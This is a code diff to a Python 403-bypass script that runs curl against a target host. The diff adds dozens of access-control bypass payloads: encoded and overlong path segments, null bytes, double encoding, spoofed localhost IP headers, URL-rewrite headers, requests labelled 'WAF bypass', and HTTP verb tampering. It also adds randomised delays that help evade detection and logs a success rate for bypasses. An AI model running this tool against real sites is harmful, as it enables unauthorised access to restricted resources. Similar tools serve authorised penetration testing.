@@ -46,30 +46,131 @@ headers = [
     ]
 
 urlListBuilder = [
-    (f"{HOSTNAME}/{PATH}", [], "Original"),
-    (f"{HOSTNAME}/%2e/{PATH}", [], "Path traversal %2e"),
+    # === BASELINE ===
+    (f"{HOSTNAME}/{PATH}", [], "Original Request"),
+    
+    # === PATH OBFUSCATION (Advanced) ===
+    (f"{HOSTNAME}/{PATH}", [], "Standard"),
+    (f"{HOSTNAME}/%2e/{PATH}", [], "Single dot encoded"),
+    (f"{HOSTNAME}/%2e%2e/{PATH}", [], "Double dot encoded"),
     (f"{HOSTNAME}/{PATH}/.", [], "Trailing dot"),
-    (f"{HOSTNAME}//{PATH}//", [], "Double slashes"),
-    (f"{HOSTNAME}/./{PATH}/./", [], "Dot segments"),
-    (f"{HOSTNAME}/{PATH}anything", [("X-Original-URL", f"/{PATH}")], "X-Original-URL"),
-    (f"{HOSTNAME}/{PATH}", [("X-Custom-IP-Authorization", "127.0.0.1")], "X-Custom-IP-Authorization"),
-    (f"{HOSTNAME}", [("X-Rewrite-URL", f"/{PATH}")], "X-Rewrite-URL"),
-    (f"{HOSTNAME}/{PATH}", [("Referer", f"/{PATH}")], "Referer"),
-    (f"{HOSTNAME}/{PATH}", [("X-Originating-IP", "127.0.0.1")], "X-Originating-IP"),
-    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-For", "127.0.0.1")], "X-Forwarded-For"),
-    (f"{HOSTNAME}/{PATH}", [("X-Remote-IP", "127.0.0.1")], "X-Remote-IP"),
-    (f"{HOSTNAME}/{PATH}", [("X-Client-IP", "127.0.0.1")], "X-Client-IP"),
-    (f"{HOSTNAME}/{PATH}", [("X-Host", "127.0.0.1")], "X-Host"),
-    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-Host", "127.0.0.1")], "X-Forwarded-Host"),
-    (f"{HOSTNAME}/{PATH}%20/", [], "Trailing space encoded"),
-    (f"{HOSTNAME}/%20{PATH}%20/", [], "Spaces around path"),
-    (f"{HOSTNAME}/{PATH}?", [], "Trailing question mark"),
-    (f"{HOSTNAME}/{PATH}???", [], "Multiple question marks"),
-    (f"{HOSTNAME}/{PATH}//", [], "Double trailing slash"),
-    (f"{HOSTNAME}/{PATH}/", [], "Single trailing slash"),
-    (f"{HOSTNAME}/{PATH}/.randomstring", [], "Hidden file"),
+    (f"{HOSTNAME}/{PATH}/..", [], "Trailing double dot"),
     (f"{HOSTNAME}/{PATH}..;/", [], "Semicolon bypass"),
+    (f"{HOSTNAME}/{PATH};/", [], "Semicolon separator"),
+    (f"{HOSTNAME}/{PATH}%00", [], "Null byte"),
+    (f"{HOSTNAME}/{PATH}%20", [], "Trailing space"),
+    (f"{HOSTNAME}/{PATH}%09", [], "Tab character"),
+    (f"{HOSTNAME}/{PATH}%0a", [], "Line feed"),
+    (f"{HOSTNAME}/{PATH}?", [], "Empty query"),
+    (f"{HOSTNAME}/{PATH}??", [], "Double question mark"),
+    (f"{HOSTNAME}/{PATH}???", [], "Triple question mark"),
+    (f"{HOSTNAME}/{PATH}#", [], "Fragment identifier"),
+    (f"{HOSTNAME}/{PATH}/*", [], "Wildcard"),
+    
+    # === CASE MANIPULATION ===
+    (f"{HOSTNAME}/{PATH.upper()}", [], "Uppercase path"),
+    (f"{HOSTNAME}/{PATH.lower()}", [], "Lowercase path"),
+    (f"{HOSTNAME}/{PATH.capitalize()}", [], "Capitalized path"),
+    
+    # === DOUBLE ENCODING ===
+    (f"{HOSTNAME}/%252e/{PATH}", [], "Double encoded dot"),
+    (f"{HOSTNAME}/{PATH.replace('/', '%252f')}", [], "Double encoded slash"),
+    
+    # === UNICODE/UTF-8 TRICKS ===
+    (f"{HOSTNAME}/{PATH}%ef%bc%8f", [], "Unicode slash"),
+    (f"{HOSTNAME}/{PATH}%c0%af", [], "Overlong UTF-8 slash"),
+    
+    # === SLASHES VARIATIONS ===
+    (f"{HOSTNAME}//{PATH}", [], "Double leading slash"),
+    (f"{HOSTNAME}/{PATH}//", [], "Double trailing slash"),
+    (f"{HOSTNAME}//{PATH}//", [], "Double both slashes"),
+    (f"{HOSTNAME}/./{PATH}", [], "Dot prefix"),
+    (f"{HOSTNAME}/./{PATH}/./", [], "Dot segments"),
+    (f"{HOSTNAME}/{PATH}/..;/test", [], "Path traversal attempt"),
+    (f"{HOSTNAME}\\{PATH.replace('/', '\\\\')}", [], "Backslash instead of slash"),
+    
+    # === HTTP VERB TAMPERING ===
+    
+    # === HEADERS - IP SPOOFING ===
+    (f"{HOSTNAME}/{PATH}", [("X-Originating-IP", "127.0.0.1")], "X-Originating-IP localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-For", "127.0.0.1")], "X-Forwarded-For localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded", "127.0.0.1")], "X-Forwarded localhost"),
+    (f"{HOSTNAME}/{PATH}", [("Forwarded-For", "127.0.0.1")], "Forwarded-For localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Remote-IP", "127.0.0.1")], "X-Remote-IP localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Remote-Addr", "127.0.0.1")], "X-Remote-Addr localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-ProxyUser-Ip", "127.0.0.1")], "X-ProxyUser-Ip localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Original-URL", f"/{PATH}")], "X-Original-URL"),
+    (f"{HOSTNAME}/{PATH}", [("X-Client-IP", "127.0.0.1")], "X-Client-IP localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Real-IP", "127.0.0.1")], "X-Real-IP localhost"),
+    (f"{HOSTNAME}/{PATH}", [("True-Client-IP", "127.0.0.1")], "True-Client-IP localhost"),
+    (f"{HOSTNAME}/{PATH}", [("Cluster-Client-IP", "127.0.0.1")], "Cluster-Client-IP"),
+    (f"{HOSTNAME}/{PATH}", [("X-ProxyUser-IP", "127.0.0.1")], "X-ProxyUser-IP"),
+    (f"{HOSTNAME}/{PATH}", [("CF-Connecting-IP", "127.0.0.1")], "Cloudflare IP"),
+    
+    # === HEADERS - URL REWRITING ===
+    (f"{HOSTNAME}", [("X-Rewrite-URL", f"/{PATH}")], "X-Rewrite-URL"),
+    (f"{HOSTNAME}", [("X-Original-URL", f"/{PATH}")], "X-Original-URL on root"),
+    (f"{HOSTNAME}/{PATH}test", [("X-Rewrite-URL", f"/{PATH}")], "X-Rewrite-URL with fake path"),
+    (f"{HOSTNAME}/", [("X-Original-URL", f"/{PATH}")], "X-Original-URL root"),
+    
+    # === HEADERS - HOST MANIPULATION ===
+    (f"{HOSTNAME}/{PATH}", [("X-Host", "127.0.0.1")], "X-Host localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-Host", "127.0.0.1")], "X-Forwarded-Host localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-Server", "127.0.0.1")], "X-Forwarded-Server"),
+    
+    # === HEADERS - CUSTOM AUTHORIZATION ===
+    (f"{HOSTNAME}/{PATH}", [("X-Custom-IP-Authorization", "127.0.0.1")], "Custom IP Auth"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-For", "localhost")], "X-FF localhost string"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-For", "127.0.0.1, 127.0.0.1")], "X-FF double localhost"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-For", f"{HOSTNAME}")], "X-FF same hostname"),
+    
+    # === HEADERS - REFERER TRICKS ===
+    (f"{HOSTNAME}/{PATH}", [("Referer", f"{METHOD}://{HOSTNAME}/{PATH}")], "Referer same URL"),
+    (f"{HOSTNAME}/{PATH}", [("Referer", f"{METHOD}://{HOSTNAME}/")], "Referer root"),
+    (f"{HOSTNAME}/{PATH}", [("Referer", f"{METHOD}://{HOSTNAME}")], "Referer domain"),
+    (f"{HOSTNAME}/{PATH}", [("Referer", "http://localhost")], "Referer localhost"),
+    
+    # === HEADERS - PROTOCOL MANIPULATION ===
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-Proto", "http")], "X-Forwarded-Proto HTTP"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-Proto", "https")], "X-Forwarded-Proto HTTPS"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-Scheme", "http")], "X-Forwarded-Scheme"),
+    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-SSL", "on")], "X-Forwarded-SSL"),
+    
+    # === HEADERS - WAF BYPASS ===
+    (f"{HOSTNAME}/{PATH}", [("X-Original-Remote-Addr", "127.0.0.1")], "Original Remote Addr"),
+    (f"{HOSTNAME}/{PATH}", [("X-Client-IP", "127.0.0.1"), ("X-Forwarded-For", "127.0.0.1")], "Multiple IP headers"),
+    (f"{HOSTNAME}/{PATH}", [("Base-Url", f"{METHOD}://{HOSTNAME}/{PATH}")], "Base-Url header"),
+    (f"{HOSTNAME}/{PATH}", [("Client-IP", "127.0.0.1")], "Client-IP"),
+    (f"{HOSTNAME}/{PATH}", [("Http-Url", f"/{PATH}")], "Http-Url"),
+    (f"{HOSTNAME}/{PATH}", [("Proxy-Host", f"{HOSTNAME}")], "Proxy-Host"),
+    (f"{HOSTNAME}/{PATH}", [("Request-Uri", f"/{PATH}")], "Request-Uri"),
+    (f"{HOSTNAME}/{PATH}", [("X-Proxy-Url", f"{METHOD}://{HOSTNAME}/{PATH}")], "X-Proxy-Url"),
+    (f"{HOSTNAME}/{PATH}", [("Dest-Url", f"{METHOD}://{HOSTNAME}/{PATH}")], "Dest-Url"),
+    (f"{HOSTNAME}/{PATH}", [("Redirect", f"{METHOD}://{HOSTNAME}/{PATH}")], "Redirect header"),
+    
+    # === COMBINED ATTACKS ===
+    (f"{HOSTNAME}/%2e/{PATH}", [("X-Forwarded-For", "127.0.0.1")], "Path obfuscation + IP spoof"),
+    (f"{HOSTNAME}", [("X-Rewrite-URL", f"/%2e/{PATH}")], "Rewrite with encoded path"),
+    (f"{HOSTNAME}/{PATH}", [("X-Original-URL", f"/{PATH}"), ("X-Forwarded-For", "127.0.0.1")], "Multiple bypass headers"),
+    
+    # === RARE BUT EFFECTIVE ===
+    (f"{HOSTNAME}/{PATH}%2f", [], "Encoded trailing slash"),
+    (f"{HOSTNAME}/{PATH.replace('/', '%2f')}", [], "Full path encoded"),
+    (f"{HOSTNAME}/{PATH}index.html", [], "Fake file append"),
+    (f"{HOSTNAME}/{PATH}.json", [], "JSON extension"),
+    (f"{HOSTNAME}/{PATH}.php", [], "PHP extension"),
+    (f"{HOSTNAME}/{PATH}.aspx", [], "ASPX extension"),
+    (f"{HOSTNAME}/{PATH}.jsp", [], "JSP extension"),
+    (f"{HOSTNAME}/{PATH}/random", [], "Fake subdirectory")
 ]
+
+http_methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "TRACE", "PATCH", "CONNECT"]
+
+for method in http_methods:
+    if method != "GET":
+        urlListBuilder.append(
+            (f"{HOSTNAME}/{PATH}", [], f"HTTP Method: {method}")
+        )
 
 with open(log_file, "w", encoding="utf-8") as log:
     log.write(f"403 Bypass Test Results\n")
@@ -82,7 +183,12 @@ with open(log_file, "w", encoding="utf-8") as log:
     redirect_count = 0
     
     for url, extra_headers, description in urlListBuilder:
-        cmd = ["curl", "-X", "GET", f"{METHOD}://{url}"]
+
+        current_method = "GET"
+        if description.startswith("HTTP Method:"):
+            current_method = description.split(": ")[1]
+            
+        cmd = ["curl", "-X", current_method, f"{METHOD}://{url}"]
             
         for key, value in headers:
             cmd.extend(["-H", f"{key}: {value}"])
@@ -99,8 +205,16 @@ with open(log_file, "w", encoding="utf-8") as log:
         ])
 
         try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-            http_code_match = re.search(r"HTTP_CODE:(\d+)", result.stdout)
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                encoding="utf-8",
+                errors="replace",
+                timeout=30,
+            )
+            stdout_text = result.stdout or ""
+            http_code_match = re.search(r"HTTP_CODE:(\d+)", stdout_text)
             
             if http_code_match:
                 http_code = http_code_match.group(1)
@@ -164,15 +278,18 @@ with open(log_file, "w", encoding="utf-8") as log:
                 print(f"\033[91m✗ NO HTTP CODE\033[0m : {description} -> {METHOD}://{url}")
         
         except subprocess.TimeoutExpired:
-            print(f"\033[91m✗ TIMEOUT\033[0m : {description} -> {METHOD}://{url}")
+            print(f"\033[91m✗ TIMEOUT\033[0m {description[:40]}")
+        except Exception as e:
+            print(f"\033[91m✗ ERROR\033[0m {description[:40]} - {str(e)[:30]}")
 
         test_number += 1
-        time.sleep(random.uniform(0.5, 2.0))
+        time.sleep(random.uniform(0.4, 2.8))
     
     log.write(f"\n{'='*80}\n")
     log.write(f"Total successful bypasses (200): {success_count}\n")
     log.write(f"Total redirects (3xx): {redirect_count}\n")
     log.write(f"Total interesting responses: {success_count + redirect_count}\n")
+    log.write(f"Success rate: {((success_count + redirect_count) / (test_number - 1) * 100):.2f}%\n")
 
 print(f"\n{'='*80}")
 print(f"Results:")
